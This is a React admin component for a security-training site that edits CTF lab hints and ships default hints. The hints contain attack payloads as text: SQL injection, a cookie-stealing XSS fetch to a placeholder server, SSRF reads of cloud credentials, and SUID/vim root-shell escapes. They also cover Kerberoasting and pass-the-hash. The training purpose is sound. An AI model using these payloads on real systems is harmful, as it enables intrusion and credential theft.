"use client";

import { useState } from "react";

type HintRow = { level: 1 | 2 | 3; text: string; pointCost: number; saved: boolean };
type StageHints = Record<string, HintRow[]>;

// ── Default hint content for every lab ────────────────────────────────────────

const DEFAULTS: Record<string, Record<string, { level: 1|2|3; text: string; pointCost: number }[]>> = {
  "welcome-ctf": {
    task_1: [
      { level: 1, pointCost: 10, text: "Look at what the web server exposes at its root. Common files like robots.txt, .htaccess, or a /backup directory often reveal hidden paths." },
      { level: 2, pointCost: 20, text: "Try directory enumeration on the URL. Look for /admin, /secret, or /flag paths. The answer is usually in a file you can read directly." },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "The page accepts some kind of user input. Think about what happens when you inject unexpected characters or try common CTF payloads." },
      { level: 2, pointCost: 20, text: "Try basic injection payloads. If it's a command injection challenge, try: ; id or && cat /etc/passwd to test execution." },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "You should have found the flag in an earlier step. Flags follow the format SAGE{...}. Make sure you're submitting the full string including the braces." },
    ],
  },
  "sql-injection-101": {
    task_1: [
      { level: 1, pointCost: 10, text: "Try adding a single quote ' to the input field. If the page errors or behaves differently, the input is being passed directly to a SQL query." },
      { level: 2, pointCost: 20, text: "Classic SQLi test: ' OR '1'='1 — if this logs you in without credentials, the query is vulnerable. The WHERE clause is being bypassed." },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "Use UNION-based injection to extract data from other tables. First determine the number of columns: ' ORDER BY 1-- then ' ORDER BY 2-- etc." },
      { level: 2, pointCost: 20, text: "Once you know the column count, try: ' UNION SELECT null, table_name FROM information_schema.tables-- to list all database tables." },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "You've found the users table. Try extracting username and password columns: ' UNION SELECT username, password FROM users--" },
      { level: 2, pointCost: 20, text: "If passwords are hashed, use a hash identifier to determine the algorithm, then check CrackStation or use hashcat with a wordlist." },
    ],
  },
  "soc-alert-investigation": {
    investigation: [
      { level: 1, pointCost: 10, text: "Look at each log source separately before trying to correlate. Authentication failures from external IPs are common scanning noise — focus on what actually succeeded." },
      { level: 2, pointCost: 20, text: "The attacker's C2 server IP does not appear in auth.log. You'll need to cross-reference Sysmon and DNS tabs to find the outbound C2 beacon." },
      { level: 3, pointCost: 30, text: "The initial foothold left traces in Sysmon EventID 1 starting around 14:03. What process opened a document, and what did it spawn immediately after? Trace the process chain." },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "Incident response containment must preserve evidence while stopping the attack. Which actions could destroy forensic evidence if done too early?" },
      { level: 2, pointCost: 20, text: "Reimaging a host before memory and disk capture destroys forensic evidence permanently. Notify CISO and Legal early — breach notification laws may apply." },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "The attacker pivoted to a second host before the original workstation was isolated. Which server started making outbound connections shortly after the initial compromise?" },
      { level: 2, pointCost: 20, text: "WMIC with /node: is a lateral movement technique that creates remote processes via WMI. On the target server, look for WmiPrvSE.exe as the parent of a suspicious process." },
    ],
  },
  "network-forensics-101": {
    task_1: [
      { level: 1, pointCost: 10, text: "Open the packet capture in Wireshark. Use the 'Statistics > Protocol Hierarchy' view to see what protocols are present and in what volume." },
      { level: 2, pointCost: 20, text: "Filter by common credential-bearing protocols: http, ftp, pop, imap, telnet. Look for POST requests or LOGIN commands with plaintext credentials." },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "Look for unusual outbound connections — especially to IPs that don't match known services. Beaconing C2 traffic often has regular time intervals." },
      { level: 2, pointCost: 20, text: "Filter for DNS queries: dns. Look for long subdomain strings or queries to unusual domains — these can indicate DNS tunnelling or C2 domain fronting." },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "Large outbound transfers to unexpected destinations are a red flag. Use Statistics > Endpoints to find which external IP received the most data." },
      { level: 2, pointCost: 20, text: "Follow the TCP stream of the suspicious outbound connection. Large data volumes going out — especially compressed or encoded — indicate exfiltration." },
    ],
  },
  "privilege-escalation": {
    task_1: [
      { level: 1, pointCost: 10, text: "Search GTFOBins (gtfobins.github.io) for each binary in the SUID output. Not every SUID binary is exploitable — one has a documented shell escape." },
      { level: 2, pointCost: 20, text: "The `find` command with -exec can run arbitrary commands. With the SUID bit set, those commands run as root: find . -exec /bin/sh \\; -quit" },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "vim can execute shell commands from within the editor. Since you're running it as root via sudo, any shell you spawn will inherit root privileges." },
      { level: 2, pointCost: 20, text: "Inside vim, type :!sh to open a shell, or use :set shell=/bin/sh then :shell. Either approach drops you into a root shell without leaving vim." },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "You have a root shell. The question asks what command to use to READ the flag file — not the flag content itself. Think: cat, less, more, strings + the file path." },
    ],
  },
  "osint-investigation": {
    task_1: [
      { level: 1, pointCost: 10, text: "Start with the basics: search the target's name + common social media platforms. LinkedIn, Twitter/X, GitHub, and Facebook often expose more than people realise." },
      { level: 2, pointCost: 20, text: "Use Google dorks to find indexed content about the target: site:linkedin.com 'target name', or 'target name' filetype:pdf to find documents they've authored." },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "Look for email addresses associated with the target. Hunter.io or email permutation tools can find corporate emails based on naming conventions." },
      { level: 2, pointCost: 20, text: "Check the Wayback Machine (web.archive.org) for historical versions of the target's website or profiles — deleted content is often still cached." },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "Organisation chart and employee information can often be found on LinkedIn. Look for job postings too — they reveal internal technologies and team structures." },
      { level: 2, pointCost: 20, text: "Company metadata in PDF documents (Author, Creator fields) can reveal internal usernames or software versions. Use ExifTool to extract document metadata." },
    ],
  },
  "windows-log-analysis": {
    task_1: [
      { level: 1, pointCost: 10, text: "Focus on Security Event Log IDs: 4624 (logon success), 4625 (logon failure), 4648 (explicit credential logon). Look for patterns suggesting brute force." },
      { level: 2, pointCost: 20, text: "A large number of 4625 failures from the same source IP followed by a 4624 success is a classic brute force pattern. Check the source workstation name and logon type." },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "Look for logon events with LogonType 10 (RemoteInteractive = RDP) or LogonType 3 (Network). These indicate remote access to the system." },
      { level: 2, pointCost: 20, text: "After identifying the compromised account, trace what it did after logon: look for process creation events (4688) showing new processes spawned in that session." },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "Persistence mechanisms often create scheduled tasks (4698) or modify registry run keys. Look for events shortly after the attacker established their foothold." },
      { level: 2, pointCost: 20, text: "Event 7045 (new service installed) or 4698 (scheduled task created) in an attacker's timeline is a strong persistence indicator. Note the task name and command." },
    ],
  },
  "malware-triage": {
    task_1: [
      { level: 1, pointCost: 10, text: "Start with static analysis: check the file hash on VirusTotal, look at strings in the binary (strings command), and check the PE headers with a tool like PEview." },
      { level: 2, pointCost: 20, text: "Look for suspicious strings: IP addresses, URLs, registry keys, or encoded content. Long base64 strings or packed sections in the PE header indicate obfuscation." },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "Dynamic analysis: run the sample in a sandbox (like Any.run or Cuckoo) and observe its behaviour — what files does it create, what registry keys does it touch, what network connections does it make?" },
      { level: 2, pointCost: 20, text: "Look for process injection indicators: the malware may inject into a legitimate process (svchost, explorer) to hide. Check for unusual parent-child process relationships." },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "Identify the C2 infrastructure: look for hardcoded IPs/domains in strings, DNS queries in the network capture, or decode the C2 URL from any base64/XOR obfuscation." },
      { level: 2, pointCost: 20, text: "Check the malware's persistence mechanism: common locations are HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, Startup folder, or a scheduled task." },
    ],
  },
  "xss-fundamentals": {
    task_1: [
      { level: 1, pointCost: 10, text: "Find an input field that reflects your input back in the page source. Try a simple test first: type your name and check if it appears in the HTML without escaping." },
      { level: 2, pointCost: 20, text: "Classic reflected XSS test: <script>alert(1)</script> — if an alert box appears, the input is not sanitised. If it's filtered, try alternative vectors like <img src=x onerror=alert(1)>." },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "Stored XSS is injected into a database and executed when other users view the page. Look for a comment, post, or profile field that other users would see." },
      { level: 2, pointCost: 20, text: "To steal a cookie via stored XSS, your payload needs to make a request to an attacker-controlled server: <script>fetch('https://your-server/?c='+document.cookie)</script>" },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "DOM-based XSS operates entirely in the browser — the server never sees the payload. Look at the page's JavaScript to find where it reads from location.hash, location.search, or document.referrer and writes to innerHTML." },
      { level: 2, pointCost: 20, text: "If the page reads from window.location.hash and writes it to innerHTML, try: page.html#<img src=x onerror=alert(1)> — the # fragment is never sent to the server." },
    ],
  },
  "ssrf-attack": {
    task_1: [
      { level: 1, pointCost: 10, text: "Find a parameter that accepts a URL and makes a server-side request. Common examples: image URL fetchers, webhook endpoints, PDF generators, or 'load from URL' features." },
      { level: 2, pointCost: 20, text: "Test with http://127.0.0.1 or http://localhost — if the server returns internal content, SSRF is confirmed. Then try the AWS metadata endpoint: http://169.254.169.254/latest/meta-data/" },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "Once SSRF is confirmed, probe internal network ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16. The cloud metadata endpoint at 169.254.169.254 is especially valuable." },
      { level: 2, pointCost: 20, text: "AWS IMDSv1 returns credentials at: http://169.254.169.254/latest/meta-data/iam/security-credentials/ — follow the path to get AccessKeyId, SecretAccessKey, and Token." },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "Use the credentials or internal access you've gained to escalate. Look for internal services, S3 buckets, or config files accessible via the SSRF vector." },
      { level: 2, pointCost: 20, text: "Try reading internal files with file:// protocol if supported: file:///etc/passwd or file:///proc/self/environ to find environment variables with secrets." },
    ],
  },
  "active-directory-101": {
    task_1: [
      { level: 1, pointCost: 10, text: "Password spraying tests a few common passwords against many accounts (vs brute force which tests many passwords against one account). Use a tool like CrackMapExec or kerbrute." },
      { level: 2, pointCost: 20, text: "Common spray passwords: Season+Year (Spring2024), Company+Year, Welcome1. Spray slowly — most AD environments lock out after 5 failures. Check the domain's lockout policy first." },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "Kerberoasting requests Kerberos service tickets for accounts with SPNs. Any domain user can request a service ticket — no special privileges needed. Use GetUserSPNs.py from Impacket." },
      { level: 2, pointCost: 20, text: "After extracting the service ticket hash, crack it offline with hashcat: hashcat -m 13100 hash.txt wordlist.txt — service accounts often have weak, non-rotating passwords." },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "With valid credentials, enumerate AD using BloodHound/SharpHound to map the attack path to Domain Admin. Look for ACL abuses: GenericAll, WriteDACL, DCSync rights." },
      { level: 2, pointCost: 20, text: "Pass-the-Hash lets you authenticate using an NTLM hash without knowing the plaintext. Dump hashes with secretsdump.py and use them with wmiexec.py or psexec.py." },
    ],
  },
  "phishing-analysis": {
    task_1: [
      { level: 1, pointCost: 10, text: "Examine the email headers: check SPF, DKIM, and DMARC results. Look at the Reply-To address vs the From address — attackers often differ these to redirect replies." },
      { level: 2, pointCost: 20, text: "Check the sending IP against the domain's SPF record: dig TXT domain.com. If the sending IP is not authorised, SPF will fail — a strong phishing indicator." },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "Hover over links without clicking — look at the actual URL vs the displayed text. Attackers use typosquatting (paypa1.com) or URL shorteners to hide destinations." },
      { level: 2, pointCost: 20, text: "URL analysis: check the full redirect chain using a tool like urlscan.io. The first hop might look legitimate but the final destination is the malicious site." },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "For attachment analysis, check the file hash on VirusTotal without opening it. Look at the file extension carefully — attackers use double extensions like 'invoice.pdf.exe'." },
      { level: 2, pointCost: 20, text: "If the attachment is an Office document, look for macros (File > Info > Check for Issues). VBA macro code can be extracted with olevba (from the oletools suite)." },
    ],
  },
  "memory-forensics": {
    task_1: [
      { level: 1, pointCost: 10, text: "Use Volatility to list running processes: vol.py -f memory.dmp pslist. Look for unusual processes — misnamed system processes (svchost running from wrong path) or processes with no parent." },
      { level: 2, pointCost: 20, text: "Compare pslist vs psscan output — malware using DKOM (Direct Kernel Object Manipulation) may hide from pslist but still appear in psscan. Check for discrepancies." },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "Look at network connections in memory: vol.py netscan. Established connections to external IPs from unusual processes are a strong indicator of C2 activity." },
      { level: 2, pointCost: 20, text: "Dump suspicious process memory and scan for strings: vol.py -f mem.dmp memdump -p [PID] -D dump/ then strings dump/[PID].dmp | grep -E '(http|cmd|powershell)'." },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "Extract credentials from memory using the hashdump or lsadump plugin. Mimikatz-style attacks leave their signatures — look for sekurlsa-related strings in process memory." },
      { level: 2, pointCost: 20, text: "Use the cmdline plugin to see what commands were run in memory: vol.py cmdline. PowerShell -EncodedCommand is a classic obfuscation technique — base64 decode the command." },
    ],
  },
  "web-recon": {
    task_1: [
      { level: 1, pointCost: 10, text: "Start passive recon: check WHOIS, DNS records (dig ANY domain.com), and certificate transparency logs (crt.sh) to enumerate subdomains without touching the target." },
      { level: 2, pointCost: 20, text: "Use theHarvester to gather emails, subdomains, and IPs from public sources: theHarvester -d target.com -l 200 -b google,bing,linkedin" },
    ],
    task_2: [
      { level: 1, pointCost: 10, text: "Active scanning: use nmap to identify open ports and services: nmap -sV -sC -oN output.txt target.com — the -sV flag does service/version detection." },
      { level: 2, pointCost: 20, text: "Web-specific recon: gobuster or ffuf can brute-force directories and files. Common wordlists: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" },
    ],
    task_3: [
      { level: 1, pointCost: 10, text: "Technology fingerprinting: check response headers (Server, X-Powered-By), HTML source comments, and run Wappalyzer or whatweb to identify frameworks and CMS versions." },
      { level: 2, pointCost: 20, text: "Once you know the CMS or framework version, search CVE databases (cve.mitre.org, exploit-db.com) for known vulnerabilities in that specific version." },
    ],
  },
};

// ── Component ──────────────────────────────────────────────────────────────────

type ExistingHint = { level: number; text: string; pointCost: number };

export function HintEditor({
  labSlug,
  stages,
  existing,
}: {
  labSlug: string;
  stages: string[];
  existing: Record<string, ExistingHint[]>;
}) {
  const defaults = DEFAULTS[labSlug] ?? {};

  // per-stage per-level: text + pointCost
  type FormEntry = { text: string; pointCost: number; status: "idle" | "saving" | "saved" | "error" };
  type StageForm = Record<number, FormEntry>;

  function initialForm(): Record<string, StageForm> {
    const out: Record<string, StageForm> = {};
    for (const stage of stages) {
      out[stage] = {};
      for (let lvl = 1; lvl <= 3; lvl++) {
        const ex = existing[stage]?.find((h) => h.level === lvl);
        out[stage][lvl] = { text: ex?.text ?? "", pointCost: ex?.pointCost ?? 10 * lvl, status: "idle" };
      }
    }
    return out;
  }

  const [form, setForm] = useState<Record<string, StageForm>>(initialForm);
  const [loadedDefaults, setLoadedDefaults] = useState(false);

  function update(stage: string, level: number, patch: Partial<FormEntry>) {
    setForm((f) => ({ ...f, [stage]: { ...f[stage], [level]: { ...f[stage][level], ...patch } } }));
  }

  function loadDefaults() {
    setForm((prev) => {
      const next = { ...prev };
      for (const stage of stages) {
        const stageDefs = defaults[stage] ?? [];
        next[stage] = { ...prev[stage] };
        for (const d of stageDefs) {
          next[stage][d.level] = { text: d.text, pointCost: d.pointCost, status: "idle" };
        }
      }
      return next;
    });
    setLoadedDefaults(true);
  }

  async function save(stage: string, level: number) {
    const entry = form[stage][level];
    if (!entry.text.trim()) return;
    update(stage, level, { status: "saving" });
    try {
      const res = await fetch("/api/admin/hints", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ labSlug, stage, level, text: entry.text, pointCost: entry.pointCost }),
      });
      update(stage, level, { status: res.ok ? "saved" : "error" });
    } catch {
      update(stage, level, { status: "error" });
    }
  }

  async function saveAll() {
    const jobs: Promise<void>[] = [];
    for (const stage of stages) {
      for (let lvl = 1; lvl <= 3; lvl++) {
        if (form[stage][lvl].text.trim()) jobs.push(save(stage, lvl));
      }
    }
    await Promise.all(jobs);
  }

  async function del(stage: string, level: number) {
    update(stage, level, { text: "", status: "saving" });
    const params = new URLSearchParams({ labSlug, stage, level: String(level) });
    await fetch(`/api/admin/hints?${params}`, { method: "DELETE" });
    update(stage, level, { text: "", status: "idle" });
  }

  const hasDefaults = Object.keys(defaults).length > 0;

  return (
    <div className="space-y-8">
      {/* Actions bar */}
      <div className="flex flex-wrap items-center gap-3">
        {hasDefaults && (
          <button
            onClick={loadDefaults}
            className="rounded-lg border border-amber-500/30 bg-amber-500/10 px-4 py-2 text-sm font-semibold text-amber-400 hover:bg-amber-500/20 transition"
          >
            {loadedDefaults ? "Defaults loaded ✓" : "Load default hints"}
          </button>
        )}
        <button
          onClick={() => void saveAll()}
          className="rounded-lg bg-emerald-600 px-4 py-2 text-sm font-semibold text-white hover:bg-emerald-500 transition"
        >
          Save all
        </button>
        {!hasDefaults && (
          <p className="text-xs text-zinc-600 italic">No defaults configured for this lab — enter hints manually.</p>
        )}
      </div>

      {/* Per-stage hint editors */}
      {stages.map((stage) => (
        <div key={stage} className="rounded-xl border border-white/8 bg-zinc-900/40 p-5 space-y-4">
          <p className="text-xs uppercase tracking-widest text-zinc-500 font-mono">{stage}</p>

          {([1, 2, 3] as const).map((lvl) => {
            const entry = form[stage][lvl];
            const statusColor = entry.status === "saved" ? "text-emerald-400" : entry.status === "error" ? "text-red-400" : "text-zinc-600";
            const statusLabel = entry.status === "saved" ? "Saved ✓" : entry.status === "saving" ? "Saving…" : entry.status === "error" ? "Error" : "";

            return (
              <div key={lvl} className="space-y-2">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <span className="text-xs font-medium text-zinc-400">Hint {lvl}</span>
                    <div className="flex items-center gap-1.5">
                      <label className="text-[10px] text-zinc-600">Cost:</label>
                      <input
                        type="number"
                        min={0}
                        max={200}
                        value={entry.pointCost}
                        onChange={(e) => update(stage, lvl, { pointCost: Number(e.target.value) })}
                        className="w-14 bg-zinc-800 border border-white/8 rounded px-2 py-0.5 text-xs text-zinc-300 text-center"
                      />
                      <span className="text-[10px] text-zinc-600">pts</span>
                    </div>
                    {statusLabel && <span className={`text-[10px] ${statusColor}`}>{statusLabel}</span>}
                  </div>
                  <div className="flex gap-2">
                    {entry.text && (
                      <button
                        onClick={() => void del(stage, lvl)}
                        className="text-[10px] text-red-500/70 hover:text-red-400 transition"
                      >
                        Remove
                      </button>
                    )}
                    <button
                      onClick={() => void save(stage, lvl)}
                      disabled={!entry.text.trim() || entry.status === "saving"}
                      className="text-[10px] border border-zinc-700 rounded px-2 py-0.5 text-zinc-400 hover:border-zinc-500 hover:text-zinc-200 transition disabled:opacity-40"
                    >
                      Save
                    </button>
                  </div>
                </div>
                <textarea
                  value={entry.text}
                  onChange={(e) => update(stage, lvl, { text: e.target.value, status: "idle" })}
                  placeholder={`Hint level ${lvl} — subtle nudge, not the answer`}
                  rows={2}
                  className="w-full bg-zinc-800/60 border border-white/8 rounded-lg p-3 text-xs text-zinc-300 placeholder-zinc-700 resize-none focus:outline-none focus:border-emerald-500/40 font-mono leading-relaxed"
                />
              </div>
            );
          })}
        </div>
      ))}
    </div>
  );
}
